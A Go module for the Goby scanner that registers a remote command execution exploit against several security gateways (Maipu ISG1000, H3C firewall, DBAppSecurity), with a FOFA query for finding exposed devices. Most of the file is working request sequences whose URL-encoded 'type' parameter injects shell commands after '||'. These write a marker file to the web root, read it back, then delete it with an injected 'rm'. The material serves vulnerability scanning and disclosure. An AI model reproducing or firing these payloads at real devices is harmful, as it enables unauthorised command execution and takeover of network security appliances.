package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Multiple Security Gateway aaa_portal_auth_config_reset RCE",
    "Description": "A RCE in multiple security gateway. Affected products include maipu--isg1000-security-gateway , h3c-firewall, dbappsecurity-sg and others.",
    "Impact": "Multiple Security Gateway aaa_portal_auth_config_reset RCE",
    "Recommendation": "<p>1. For security devices, it's not recommended to make them accessable from Internet.</p><p>2. You should contact the product suppliance for help.</p>",
    "Product": "Multiple Security Gateway",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "多个安全网关 aaa_portal_auth_config_reset 参数命令执行漏洞",
            "Description": "<p>多款路由器存在命令执行漏洞，其中包括maipu--isg1000-security-gateway , h3c-firewall, dbappsecurity-sg等品牌。</p><p>攻击者可通过aaa_portal_auth_config_reset执行系统命令，获取系统权限危害系统安全。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可通过</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">aaa_portal_auth_config_reset执行系统命令，获取系统权限危害系统安全</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">。</span><br></p>",
            "Recommendation": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">官方暂未修复该漏洞，可通过以下方式暂缓攻击：</span><br></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "安全网关",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Multiple Security Gateway aaa_portal_auth_config_reset RCE",
            "Description": "A RCE in multiple security gateway. Affected products include maipu--isg1000-security-gateway , h3c-firewall, dbappsecurity-sg and others.",
            "Impact": "Multiple Security Gateway aaa_portal_auth_config_reset RCE",
            "Recommendation": "<p>1. For security devices, it's not recommended to make them accessable from Internet.</p><p>2. You should contact the product suppliance for help.</p>",
            "Product": "Multiple Security Gateway",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "header=\"Set-Cookie: USGSESSID\"",
    "GobyQuery": "header=\"Set-Cookie: USGSESSID\"",
    "Author": "mojie@gmail.com",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-06-07",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2022-43073"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%65%63%68%6f%20%76%75%6c%6e%5f%63%68%65%63%6b%5f%32%33%33%33%33%33%33%20%3e%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/main_logo22.txt",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "vuln_check_2333333",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%20%72%6d%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%65%63%68%6f%20%76%75%6c%6e%5f%63%68%65%63%6b%5f%32%33%33%33%33%33%33%20%3e%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/main_logo22.txt",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "vuln_check_2333333",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/?g=aaa_portal_auth_config_reset&type=%31%32%36%37%64%61%64%61%6c%6a%61%37%6f%38%39%37%38%64%37%61%37%39%37%64%61%39%37%39%73%61%7c%7c%20%72%6d%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%32%2e%74%78%74%20%7c%7c%20%6c%73%20",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10200"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
